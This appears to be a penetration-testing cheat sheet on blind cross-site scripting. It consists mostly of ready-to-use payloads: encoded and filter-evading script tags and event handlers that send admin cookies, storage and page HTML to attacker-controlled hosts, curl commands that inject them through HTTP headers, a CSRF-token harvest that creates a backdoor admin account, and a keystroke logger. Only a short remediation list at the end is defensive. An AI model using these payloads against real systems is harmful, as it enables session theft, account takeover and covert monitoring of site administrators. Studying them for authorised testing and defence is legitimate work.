---
title: "Blind XSS: Detection, Delivery & Exfiltration"
date: 2026-02-24
draft: false
---

# Blind XSS: Detection, Delivery & Exfiltration

> **Severity**: Critical (targets privileged users)
> **CWE**: CWE-79 | **OWASP**: A03:2021
> **Reference**: https://portswigger.net/web-security/cross-site-scripting/cheat-sheet

---

## What Is Blind XSS?

Blind XSS is a subtype of stored XSS where the payload fires in a context **you cannot directly observe**: an admin panel, an internal log viewer, a support dashboard, a PDF report renderer, or an email client. You inject it and wait — when the privileged user loads the page, you receive a callback.

The impact is disproportionately high: the payload executes in an authenticated admin session with elevated permissions.

---

## Where Blind XSS Fires

```
[ADMIN-TARGETING INJECTION POINTS]
Support ticket subject / body       → admin opens ticket
Contact form name / email           → admin views in CRM
Bug report description              → security team reviews
User registration fields            → admin views user list
Username / display name             → shown in admin panel
Bio / address / company field       → admin user management
File upload filename                → shown in file manager

[HTTP HEADER SINKS — logged and rendered]
User-Agent                          → access log viewer in admin
Referer                             → referral analytics dashboard
X-Forwarded-For                     → IP-based log renderer
Accept-Language                     → localization log / debug panel
Cookie value                        → cookie logger / session viewer

[AUTOMATED PIPELINE SINKS]
CSV / Excel import → field rendered in data table
XML / JSON import → field rendered in dashboard
API webhooks stored for replay → webhook log viewer
Error messages → error log dashboard (renders user input in message)
Search queries → search analytics (admin reviews top searches)
Notification templates → rendered in notification center

[EXTERNAL EMAIL CLIENTS]
Contact form → rendered in Outlook/Gmail (may execute in preview)
Unsubscribe reason field → rendered in marketing platform
Invoice/order fields → rendered in finance dashboard
```

---

## Blind XSS Platforms

### XSSHunter (Trufflesecurity — recommended)

```bash
# Sign up at: https://xsshunter.trufflesecurity.com
# Get your unique payload:
<script src="https://js.rip/YOURPAYLOAD"></script>

# When fired, you receive a report containing:
# - URL where it fired
# - DOM snapshot (full HTML)
# - Cookies (HttpOnly excluded)
# - Screenshot (headless browser)
# - Referrer, user agent
# - Timestamp

# Alternative hosted instances:
https://xss.report/
https://ezxss.com/
```

### Interactsh (for DNS/HTTP OOB confirmation)

```bash
# Free public server:
interactsh-client -v
# Get: abc123.oast.fun

# Self-hosted:
go install github.com/projectdiscovery/interactsh/cmd/interactsh-server@latest
interactsh-server -domain your-domain.com

# Payload:
<script>fetch('https://abc123.oast.fun/?cookie='+document.cookie)</script>
<img src=x onerror="fetch('https://abc123.oast.fun/?c='+document.cookie)">
```

### Burp Collaborator (Burp Pro)

```bash
# Generate collaborator payload from Burp:
# Burp menu → Burp Collaborator client → Copy to clipboard
# Use: abc123.burpcollaborator.net or abc123.oastify.com

# "Collaborator Everywhere" extension:
# Auto-injects collaborator URLs in all parameters / headers
# Best for passive blind XSS hunting during normal browsing

# Extension: "Blind XSS" (fires collaborator on XSS execution)
```

### Self-Hosted Receiver

```bash
# Minimal HTTP listener:
python3 -m http.server 80
# Any request to your IP appears in terminal

# Netcat listener:
nc -lvnp 80

# Full logging server (Python):
python3 -c "
from http.server import HTTPServer, BaseHTTPRequestHandler
import urllib.parse, datetime

class H(BaseHTTPRequestHandler):
    def do_GET(self):
        print(f'[{datetime.datetime.now()}] {self.path}')
        print(f'  UA: {self.headers.get(\"User-Agent\")}')
        self.send_response(200)
        self.end_headers()
    def log_message(self, *a): pass

HTTPServer(('0.0.0.0', 80), H).serve_forever()
"
```

---

## Payload Library — All Encoding Variants

### Primary Blind XSS Payloads (XSSHunter style)

```html
[RAW]
<script src="https://js.rip/PAYLOAD"></script>
<script src="//js.rip/PAYLOAD"></script>

[HTML ENTITY — angle brackets]
&#x3c;script src=https://js.rip/PAYLOAD&#x3e;&#x3c;/script&#x3e;
&#60;script src=https://js.rip/PAYLOAD&#62;&#60;/script&#62;

[URL ENCODED]
%3Cscript%20src%3Dhttps%3A%2F%2Fjs.rip%2FPAYLOAD%3E%3C%2Fscript%3E

[DOUBLE URL ENCODED]
%253Cscript%2520src%253Dhttps%253A%252F%252Fjs.rip%252FPAYLOAD%253E%253C%252Fscript%253E

[HTML COMMENT BREAK — bypass keyword filters]
<scr<!--esi-->ipt src=https://js.rip/PAYLOAD></scr<!--esi-->ipt>
<scr<!---->ipt src=//js.rip/PAYLOAD></script>
```

### Inline Blind XSS (when external script blocked)

```html
[FETCH to your server — cookie exfil]
<script>fetch('https://YOUR_SERVER/?c='+encodeURIComponent(document.cookie))</script>
<img src=x onerror="fetch('https://YOUR_SERVER/?c='+document.cookie)">
<svg onload="fetch('https://YOUR_SERVER/?c='+document.cookie)">

[HTML ENTITY — event value encoded]
<img src=x onerror="&#102;&#101;&#116;&#99;&#104;&#40;&#39;https://YOUR_SERVER/?c=&#39;&#43;document.cookie&#41;">
<img src=x onerror="&#x66;&#x65;&#x74;&#x63;&#x68;('https://YOUR_SERVER/?c='+document.cookie)">

[BASE64 EVAL — survives most keyword filters]
<img src=x onerror="eval(atob('ZmV0Y2goJ2h0dHBzOi8vWU9VUl9TRVJWRVI/Yz0nK2RvY3VtZW50LmNvb2tpZSk='))">
<!-- Decoded: fetch('https://YOUR_SERVER/?c='+document.cookie) -->

[URL ENCODED]
%3Cimg%20src%3Dx%20onerror%3D%22fetch('https://YOUR_SERVER/?c='+document.cookie)%22%3E
%3Csvg%20onload%3D%22fetch('https://YOUR_SERVER/?c='+document.cookie)%22%3E

[DOUBLE URL ENCODED]
%253Cimg%2520src%253Dx%2520onerror%253D%2522fetch('https://YOUR_SERVER/?c='+document.cookie)%2522%253E

[DOM DUMP — full page sent to your server]
<script>fetch('https://YOUR_SERVER/?h='+btoa(document.documentElement.outerHTML))</script>
<script>
fetch('https://YOUR_SERVER/', {
  method: 'POST',
  body: JSON.stringify({
    cookie: document.cookie,
    url: location.href,
    dom: document.documentElement.outerHTML
  })
});
</script>

[IMAGE BEACON — minimal, no fetch API needed]
<script>new Image().src='https://YOUR_SERVER/?c='+encodeURIComponent(document.cookie)</script>
<img src=x onerror="new Image().src='https://YOUR_SERVER/?c='+document.cookie">

[NAVIGATOR BEACON — fire-and-forget, no response needed]
<script>navigator.sendBeacon('https://YOUR_SERVER/', document.cookie)</script>
```

### Blind XSS in HTTP Headers (Burp Repeater / curl)

```bash
# User-Agent injection:
curl -A "<script src=https://js.rip/PAYLOAD></script>" https://target.com/
curl -A "<img src=x onerror=fetch('https://YOUR_SERVER/?c='+document.cookie)>" https://target.com/
curl -A "&#x3c;script src=https://js.rip/PAYLOAD&#x3e;&#x3c;/script&#x3e;" https://target.com/
curl -A "%3Cscript%20src%3Dhttps%3A%2F%2Fjs.rip%2FPAYLOAD%3E%3C%2Fscript%3E" https://target.com/

# Referer injection:
curl -e "<script src=https://js.rip/PAYLOAD></script>" https://target.com/
curl -H "Referer: <img src=x onerror=fetch('https://YOUR_SERVER/?c='+document.cookie)>" https://target.com/

# X-Forwarded-For:
curl -H "X-Forwarded-For: <script>fetch('https://YOUR_SERVER/?c='+document.cookie)</script>" https://target.com/
curl -H "X-Forwarded-For: &#x3c;script src=https://js.rip/P&#x3e;&#x3c;/script&#x3e;" https://target.com/

# Accept-Language:
curl -H "Accept-Language: <img src=x onerror=fetch('https://YOUR_SERVER/?c='+document.cookie)>" https://target.com/

# Custom headers that may be logged:
curl -H "X-Real-IP: <script>alert(1)</script>" https://target.com/
curl -H "True-Client-IP: <script src=//js.rip/P></script>" https://target.com/
```

---

## Quick Payload Reference — Copy-Paste Arsenal

```html
<!-- HTML Entity Encoding -->
&#x3C;script&#x3E;alert(1)&#x3C;/script&#x3E;
&#x22; onerror=&#x22;fetch(&#x27;https://xss.report/c/blitz&#x27;)&#x22;
&lt;img src=&quot;x&quot; alt=&quot;&#x22; onerror=&#x22;fetch(&#x27;https://xss.report/c/blitz&#x27;)&#x22;&quot; /&gt;

<!-- URL Encoding -->
%3Cscript%3Ealert(1)%3C/script%3E

<!-- Unicode Escape -->
\u003Cscript\u003Ealert(1)\u003C/script\u003E

<!-- Dynamic Concatenation -->
<scr + ipt>alert(1)</scr + ipt>

<!-- Spaces in tag -->
<scr ipt>alert(1)</scr ipt>

<!-- SVG wrapper -->
<svg><script>alert(1)</script></svg>

<!-- JS event reassignment -->
<img src="x" onerror="this.src='javascript:alert(1)'">

<!-- Inline focus -->
<input value="XSS" onfocus="alert('XSS')">

<!-- CSS Expression -->
<div style="width:expression(alert(1));">Test</div>

<!-- Body onload — effective in blind XSS injected into page templates -->
<body onload="alert('XSS')">

<!-- Blind-specific: replace alert with real exfil -->
<body onload="fetch('https://xss.report/c/blitz')">
&#x3C;body onload=&#x22;fetch(&#x27;https://xss.report/c/blitz&#x27;)&#x22;&#x3E;
%3Cbody%20onload%3D%22fetch('https://xss.report/c/blitz')%22%3E
```

---

## Context-Specific Payloads for Common Admin Panels

### Admin Ticket / Support System

```html
[SUBJECT FIELD — rendered in admin inbox list]
<img src=x onerror=fetch('https://YOUR_SERVER/?c='+document.cookie)>
&#x3c;img src=x onerror=fetch('https://YOUR_SERVER/?c='+document.cookie)&#x3e;

[BODY FIELD — rendered in ticket detail view]
<script src="https://js.rip/PAYLOAD"></script>
<img src=x onerror="eval(atob('ZmV0Y2goJ2h0dHBzOi8vWU9VUl9TRVJWRVI/Yz0nK2RvY3VtZW50LmNvb2tpZSk='))">

[NAME FIELD — rendered in sender column]
"><script src=https://js.rip/P></script>
"><img src=x onerror=fetch('https://YOUR_SERVER/?c='+document.cookie)>
&#x22;&#x3e;&#x3c;script src=https://js.rip/P&#x3e;&#x3c;/script&#x3e;

[EMAIL FIELD — rendered as link in admin]
xss@"><script src=https://js.rip/P></script>.com
"><img src=x onerror=fetch('https://YOUR_SERVER/?c='+document.cookie)>@x.com
```

### Admin Log Viewers (rendered as table rows)

```html
[USER-AGENT in log viewer]
<script src="https://js.rip/PAYLOAD"></script>
<img src=x onerror=fetch('https://YOUR_SERVER/?c='+document.cookie)>

[IP ADDRESS in log viewer — if not validated strictly]
<script>fetch('https://YOUR_SERVER/?c='+document.cookie)</script>
127.0.0.1<script src=//js.rip/P></script>
127.0.0.1%22%3E%3Cscript%20src%3D//js.rip/P%3E%3C/script%3E

[URL PATH in log viewer]
/%3Cscript%20src%3Dhttps%3A%2F%2Fjs.rip%2FP%3E%3C%2Fscript%3E
/<script src=https://js.rip/P></script>
```

### Markdown Editors with Admin Preview

```markdown
[LINK — javascript: href]
[Support Link](javascript:fetch('https://YOUR_SERVER/?c='+document.cookie))
[click here](javascript:eval(atob('ZmV0Y2goJ2h0dHBzOi8vWU9VUl9TRVJWRVI/Yz0nK2RvY3VtZW50LmNvb2tpZSk=')))

[INLINE HTML — if renderer allows it]
<script src="https://js.rip/PAYLOAD"></script>
<img src=x onerror="fetch('https://YOUR_SERVER/?c='+document.cookie)">

[IMAGE REFERENCE]
![x](x" onerror="fetch('https://YOUR_SERVER/?c='+document.cookie))
```

---

## Advanced Exfiltration Payloads

### Full DOM + Screenshot Equivalent

```javascript
// Send full page HTML for manual review:
<script>
(function(){
  var data = {
    url: location.href,
    cookie: document.cookie,
    localStorage: JSON.stringify(localStorage),
    sessionStorage: JSON.stringify(sessionStorage),
    dom: document.documentElement.outerHTML.substring(0, 50000)
  };
  fetch('https://YOUR_SERVER/', {
    method: 'POST',
    headers: {'Content-Type': 'application/json'},
    body: JSON.stringify(data)
  });
})();
</script>
```

### CSRF Token Harvest + Exploit Chain

```javascript
// Step 1: Harvest admin CSRF token
// Step 2: Use it to create backdoor admin account
<script>
fetch('/admin/dashboard').then(r=>r.text()).then(html=>{
  // Extract CSRF token
  let csrf = (html.match(/csrf[_-]?token[^"]*value="([^"]+)"/i)||[])[1]
            ||(html.match(/name="csrf[^"]*"[^>]*value="([^"]+)"/i)||[])[1]
            ||(document.querySelector('[name*=csrf]')||{}).value;

  // Create backdoor admin user
  if(csrf) {
    fetch('/admin/users/create', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/x-www-form-urlencoded',
        'X-CSRF-Token': csrf
      },
      body: 'username=backdoor&password=P@ss123!&role=admin&email=x@x.com'
    }).then(r => {
      fetch('https://YOUR_SERVER/?result='+r.status+'&csrf='+encodeURIComponent(csrf));
    });
  } else {
    fetch('https://YOUR_SERVER/?csrf=NOT_FOUND&dom='+btoa(html.substring(0,5000)));
  }
});
</script>
```

### Keylogger — Captures Admin Input

```javascript
<script>
(function(){
  var buf = '';
  document.addEventListener('keypress', function(e) {
    buf += String.fromCharCode(e.which);
    if(buf.length >= 30) {
      new Image().src = 'https://YOUR_SERVER/k?d=' + encodeURIComponent(buf);
      buf = '';
    }
  });
  // Flush on unload:
  window.addEventListener('beforeunload', function() {
    if(buf) new Image().src = 'https://YOUR_SERVER/k?d=' + encodeURIComponent(buf);
  });
})();
</script>
```

---

## Polyglot Payloads — One Payload, Multiple Contexts

Polyglots fire in multiple injection contexts without knowing which one applies:

```
[POLYGLOT 1 — works in HTML body, attribute, and JS string]
jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>\x3e

[POLYGLOT 2 — attribute + HTML context]
\"'><img src=x onerror=fetch('https://YOUR_SERVER/?c='+document.cookie)>
%22%27%3E%3Cimg%20src%3Dx%20onerror%3Dfetch('https://YOUR_SERVER/?c='+document.cookie)%3E

[POLYGLOT 3 — covers JS string + HTML body + href]
'-fetch('https://YOUR_SERVER/?c='+document.cookie)-'
"-fetch('https://YOUR_SERVER/?c='+document.cookie)-"
</script><img src=x onerror=fetch('https://YOUR_SERVER/?c='+document.cookie)>

[POLYGLOT 4 — covers JSON + HTML + JS]
{"x":"</script><script>fetch('https://YOUR_SERVER/?c='+document.cookie)</script>"}
```

---

## Tools

```bash
# PortSwigger XSS Cheat Sheet (filter by tag/event/encoding):
# https://portswigger.net/web-security/cross-site-scripting/cheat-sheet

# XSSHunter — blind XSS with screenshot + DOM capture:
# https://xsshunter.trufflesecurity.com

# Burp Suite — blind XSS workflow:
# 1. Burp → Collaborator client → generate payload domain
# 2. Extension "Collaborator Everywhere" → auto-injects in all params/headers
# 3. Browse entire app while logged in → any stored input auto-tested
# 4. Check Collaborator for callbacks
# 5. Extension "Blind XSS" for specialized header injection

# interactsh for OOB HTTP/DNS:
interactsh-client -v
# Use: <img src=x onerror="fetch('https://UNIQUE.oast.fun/?c='+document.cookie)">

# dalfox for blind mode:
dalfox url "https://target.com/contact" \
  --blind "https://YOUR_SERVER/" \
  --method POST \
  --data "name=INJECT&email=x@x.com&message=test"

# Manual header injection (Burp Repeater):
# Add to every request:
User-Agent: <script src=https://js.rip/PAYLOAD></script>
Referer: <img src=x onerror=fetch('https://YOUR_SERVER/?c='+document.cookie)>
X-Forwarded-For: <svg onload=fetch('https://YOUR_SERVER/?c='+document.cookie)>

# curl for quick header injection test:
curl -s -A "<img src=x onerror=fetch('https://YOUR_SERVER/?c='+document.cookie)>" \
  -e "<script src=//js.rip/P></script>" \
  https://target.com/ -o /dev/null
```

---

## Remediation Reference

- **Admin panels are not "safe"** — user-generated content rendered in admin contexts must be treated with the same sanitization rigor as public content
- **Output-encode all user data**, even in internal admin interfaces
- **HttpOnly on session cookies** limits damage when XSS fires — attacker can't directly steal cookie but can still perform actions as the admin
- **CSP on admin panels**: `script-src 'nonce-RANDOM' 'strict-dynamic'; default-src 'none'`
- **Audit log viewer rendering**: log entries must not be rendered as raw HTML
- **HTTP header storage**: sanitize before storing User-Agent, Referer, X-Forwarded-For

*PortSwigger XSS Cheat Sheet: https://portswigger.net/web-security/cross-site-scripting/cheat-sheet*
